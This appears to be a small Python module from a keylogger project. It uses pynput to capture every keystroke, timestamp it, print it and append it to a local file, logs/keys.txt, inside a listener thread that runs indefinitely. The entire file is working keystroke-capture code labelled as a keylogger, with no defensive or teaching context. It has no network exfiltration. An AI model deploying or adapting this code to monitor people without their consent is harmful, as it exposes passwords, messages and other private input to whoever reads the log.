from pynput import keyboard
from datetime import datetime
import time

running = False


def on_press(key):

    global running

    if not running:
        return

    try:
        k = key.char
    except:
        k = str(key)

    log = f"{datetime.now()} : {k}"

    print(log)

    with open("logs/keys.txt", "a") as f:
        f.write(log + "\n")


def start_keylogger():

    print("✅ Keylogger Thread Running")

    listener = keyboard.Listener(
        on_press=on_press
    )

    listener.start()

    while True:
        time.sleep(1)